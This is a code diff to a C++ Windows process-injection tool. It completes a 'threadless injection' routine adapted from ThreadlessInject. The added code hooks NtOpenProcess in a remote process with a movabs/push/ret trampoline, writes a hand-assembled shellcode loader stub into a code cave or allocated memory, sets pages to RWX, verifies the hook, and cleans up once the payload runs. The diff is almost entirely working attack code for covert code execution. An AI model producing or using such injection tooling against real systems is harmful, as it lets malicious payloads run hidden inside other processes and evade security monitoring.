@@ -969,17 +969,39 @@ bool HandleCleanup(HANDLE hProcess, std::vector<LPVOID> remoteAddrs, LPVOID loca
 // see github.com/CCob/ThreadlessInject
 bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool debug) {
 
-    // TODO find function to hook
-    DWORD64 originalInstructions_0_8 = 0;
-    UINT originalInstructions_8_B = 0;
-    DWORD64 hookedFuncAddr = 0;
-    DWORD64 virtProtAddr = 0;
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll == NULL) {
+        printf("[!] Injector: Failed to find ntdll.dll\n");
+        return false;
+    }
 
-    if (hookedFuncAddr == 0) {
+    // TODO find better function to hook? or via parameter
+    const char* hookedFuncName = "NtOpenProcess";
+    DWORD64 hookedFuncAddr = (DWORD64)GetProcAddress(hNtdll, hookedFuncName);
+    if (hookedFuncAddr == NULL) {
         printf("[!] Injector: Did not find the function to hook for threadless injection\n");
         return false;
     }
-    if (virtProtAddr == 0) {
+
+    SIZE_T readBytes = 0;
+    DWORD64 originalInstructions_0_8 = 0;
+    UINT originalInstructions_8_B = 0;
+    if (!ReadProcessMemory(hProc, (LPVOID)hookedFuncAddr, &originalInstructions_0_8, 8, &readBytes) || readBytes != 8 ||
+        !ReadProcessMemory(hProc, (LPVOID)(hookedFuncAddr+8), &originalInstructions_8_B, 4, &readBytes) || readBytes != 4) {
+        printf("[!] Injector: Failed to read original instructions of hooked function %s at %llu\n", hookedFuncName, hookedFuncAddr);
+        return false;
+    }
+
+    if (debug)
+        printf("[+] Injector: Got original instructions before hooking %llx...\n", originalInstructions_0_8);
+
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    if (hKernel32 == NULL) {
+        printf("[!] Injector: Failed to find kernel32.dll\n");
+        return false;
+    }
+    DWORD64 virtProtAddr = (DWORD64)GetProcAddress(hKernel32, "VirtualProtect");
+    if (virtProtAddr == NULL) {
         printf("[!] Injector: Did not find address of VirtualProtect for threadless injection\n");
         return false;
     }
@@ -992,15 +1014,14 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
         /* 0040 */ 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, 0x48, 0x89, 0x03, 0xB8, 0x09, 0x09, 0x09, 0x09,
         /* 0050 */ 0x89, 0x43, 0x08, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00,
         /* 0060 */ 0x00, 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83,
-        /* 0070 */ 0xC4, 0x28, 0x48, 0x83, 0xEC, 0x40, // here was the old `call payload` from ThreadlessInject, but I need to call lpStart
+        /* 0070 */ 0xC4, 0x28, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59,
+        /* 0080 */ 0x41, 0x58, 0x5A, 0x59, 0x5E, 0x53, // pushes the hooked function addr to the top of the stack (used by the ret instruction in lpStartAddr)
 
         // --- set up RCX with lpParameters and RAX with lpStart, then call RAX -> lpStart(lpParameters) ---
 
-        /* 0076 */ 0x48, 0xB9, 0x2f, 0x6d, 0x6e, 0x74, 0x2f, 0x61, 0x69, 0x6e, // movabs rcx, lpParameters (patched below)
-        /* 0080 */ 0x48, 0xB8, 0x77, 0x61, 0x73, 0x20, 0x68, 0x65, 0x72, 0x65, // movabs rax, lpStart      (patched below)
-        /* 008A */ 0xFF, 0xD0,                                                 // call rax
-
-        /* 008C */ 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x5E, 0x53, 0xC3 // cleanup, same as before
+        /* 0086 */ 0x48, 0xB9, 0x2f, 0x6d, 0x6e, 0x74, 0x2f, 0x61, 0x69, 0x6e, // movabs rcx, lpParameters (patched below)
+        /* 0090 */ 0x48, 0xB8, 0x77, 0x61, 0x73, 0x20, 0x68, 0x65, 0x72, 0x65, // movabs rax, lpStart      (patched below)
+        /* 009a */ 0x50, 0xC3                                                  // push rax, ret ("returns" to lpStartAddr, which then returns to hooked function)
     };
 
     // 1. Patch the hooked function address into the shellcode loader stub
@@ -1013,18 +1034,17 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
     *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x40) = originalInstructions_0_8;
     *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x4C) = originalInstructions_8_B;
 
-    // 4. Patch lpParameters into RCX (offset 0x78)
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x78) = (DWORD64)lpParameters;
+    // 4. Patch lpParameters into RCX (offset 0x88)
+    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x88) = (DWORD64)lpParameters;
 
-    // 5. Patch lpStart into RAX (offset 0x82)
-    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x82) = (DWORD64)lpStart;
+    // 5. Patch lpStart into RAX (offset 0x92)
+    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x92) = (DWORD64)lpStart;
 
     if (debug)
-        printf("[+] Patched and prepared the threadless loader locally\n");
+        printf("[+] Injector: Patched and prepared the threadless loader locally\n");
 
-    // TODO find code cave or alloc as fallback
+    // handle the location of the loader stub
     LPVOID loaderAddr = NULL;
-
     bool foundCodeCave = false;
     struct CodeCave {
         LPVOID address;
@@ -1033,11 +1053,19 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
     };
     auto revertCodeCave = [&](CodeCave cc) {
         DWORD oldProt = 0;
-        if (!VirtualProtectEx(hProc, cc.address, cc.originalBytes.size(), PAGE_READWRITE, &oldProt) {
-            return;
+        if (!VirtualProtectEx(hProc, cc.address, cc.originalBytes.size(), PAGE_EXECUTE_READWRITE, &oldProt)) {
+            printf("[!] Injector: Failed to unprotect code cave to RWX at %p\n", cc.address);
+            return false;
         }
-        // TODO unprotect
-        // TODO write original
+        if (!WriteProcessMemory(hProc, cc.address, cc.originalBytes.data(), cc.originalBytes.size(), NULL)) {
+            printf("[!] Injector: Failed to write back original bytes to code cave at %p\n", cc.address);
+            return false;
+        }
+        if (!VirtualProtectEx(hProc, cc.address, cc.originalBytes.size(), oldProt, &oldProt)) {
+            printf("[!] Injector: Failed to protect code cave to RX at %p\n", cc.address);
+            return false;
+        }
+        return true;
     };
     CodeCave cc = {};
 
@@ -1066,24 +1094,60 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
         return false;
     }
     if (debug)
-        printf("[+] Written the threadless shellcode loader to the remote process at %p\n", loaderAddr);
+        printf("[+] Injector: Written the threadless shellcode loader to the remote process at %p\n", loaderAddr);
 
-    // TODO write the actual hook to execute the loader on next hooked function invokation
+    // define the hook
+    std::vector<byte> hook {
+        0x48, 0xB8,                  // [Index 0-1]   movabs rax, XXXX
+        0, 0, 0, 0, 0, 0, 0, 0,      // [Index 2-9]   full 8-bytes addressing (where the loader may be)
+        0x50,                        // [Index 10]    push rax
+        0xC3                         // [Index 11]    ret (call rax, i.e. the loader)
+    };
+    // Write the address of the shellcode loader stub to the new hook
+    *reinterpret_cast<DWORD64*>(hook.data() + 0x02) = (DWORD64)loaderAddr;
+    if (debug) {
+        printf("[*] Injector: Calculated hook: ");
+        for (size_t i = 0; i < hook.size(); ++i) {
+            printf("%02X ", hook[i]);
+        }
+        printf("\n");
+    }
+
+    // write the actual hook to execute the loader on next hooked function invokation
     DWORD oldHookProtect = NULL;
-    if (!VirtualProtectEx(hProc, (LPVOID)hookedFuncAddr, shellcodeLoader.size(), PAGE_READWRITE, &oldHookProtect)) {
-        printf("[!] Injector: Failed to RW protect the hook at %p in remote process, error %i\n", loaderAddr, GetLastError());
+    if (!VirtualProtectEx(hProc, (LPVOID)hookedFuncAddr, hook.size(), PAGE_EXECUTE_READWRITE, &oldHookProtect)) {
+        printf("[!] Injector: Failed to RWX protect the hook at 0x%llx in remote process, error %i\n", hookedFuncAddr, GetLastError());
         if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
         return false;
     }
-    if (!WriteProcessMemory(hProc, loaderAddr, &shellcodeLoader, shellcodeLoader.size(), NULL)) {
-        printf("[!] Injector: Failed to write the hook to remote process at %p, error %i\n", loaderAddr, GetLastError());
+    if (!WriteProcessMemory(hProc, (LPVOID)hookedFuncAddr, &hook, hook.size(), NULL)) {
+        printf("[!] Injector: Failed to write the hook to remote process at 0x%llx, error %i\n", hookedFuncAddr, GetLastError());
         if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
         return false;
     }
-    if (!VirtualProtectEx(hProc, (LPVOID)hookedFuncAddr, shellcodeLoader.size(), PAGE_READWRITE, &oldHookProtect)) {
-        printf("[!] Injector: Failed to RX protect the hook at %p in remote process (proc will crash on next access, gl hf), error %i\n", loaderAddr, GetLastError());
+    if (!VirtualProtectEx(hProc, (LPVOID)hookedFuncAddr, hook.size(), PAGE_EXECUTE_READ, &oldHookProtect)) {
+        printf("[!] Injector: Failed to RX protect the hook at 0x%llx in remote process (proc will crash on next access, gl hf), error %i\n", hookedFuncAddr, GetLastError());
         // I would not touch anything here, hopes and prayers that the remote process does not crash now
+        if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
         return false;
+    }
+
+    // verify
+    std::vector<byte> hookVerify(hook.size());
+    if (!ReadProcessMemory(hProc, (LPVOID)hookedFuncAddr, hookVerify.data(), hook.size(), NULL)) {
+        printf("[!] Injector: Failed to verify the written hook at 0x%llx\n", hookedFuncAddr); // ignore and hope it works
+    }
+    if (hookVerify != hook) {
+        printf("[!] Injector: Failed to verify the written hook at 0x%llx\n", hookedFuncAddr);
+        if (foundCodeCave) { revertCodeCave(cc); } else { HandleCleanup(hProc, { loaderAddr }, {}); }
+        return false;
+    }
+    if (debug) {
+        printf("[*] Injector: Successfully written hook to %s at 0x%llx : ", hookedFuncName, hookedFuncAddr);
+        for (size_t i = 0; i < hookVerify.size(); ++i) {
+            printf("%02X ", hookVerify[i]);
+        }
+        printf("\n");
     }
 
     // check execution of threadless hooker
@@ -1098,14 +1162,21 @@ bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool
             printf("[:] Injector: Still waiting for execution of Threadless loader after %i seconds\n", secondsPassed);
         }
 
-        DWORD64 buf = 0;
+        DWORD64 buf = -1;
         if (!ReadProcessMemory(hProc, (LPVOID)hookedFuncAddr, &buf, sizeof(DWORD64), NULL)) {
             printf("[!] Injector: Failed to read back original hooked function, likely something wrong with the remote process\n");
             // I would not touch anything here, hopes and prayers that the remote process does not crash now
         }
+
+        // check if loader started executing (loader restores the hook, check if it is restored)
         if (buf == originalInstructions_0_8) {
-            printf("[+] Injector: Threadless loader started its execution, big success!\n");
-            // TODO cleanup of code cave or allocated memory
+            if (debug)
+                printf("[+] Injector: Got original instructions again %llx...\n", originalInstructions_0_8);
+            printf("[+] Injector: Threadless loader started its execution, big success! (probably)\n");
+            if (foundCodeCave) {
+                return revertCodeCave(cc);
+            }
+            HandleCleanup(hProc, { loaderAddr }, NULL);
             return true;
         }
     }
@@ -1144,8 +1215,7 @@ bool ExecuteDllLoader(HANDLE hProcess, Executor exec, LPVOID lpStartAddress, LPV
     }
 
     else if (exec == THREADLESS_INJECTION) {
-        // TODO convert generic lpStartAddress to "usable" Threadless payload
-        return DoHookForThreadless(hProcess, {}, debug);
+        return DoHookForThreadless(hProcess, lpStartAddress, lpParameter, debug);
     }
 
     // other executors need an existing thread -> get the optimal one for the execType
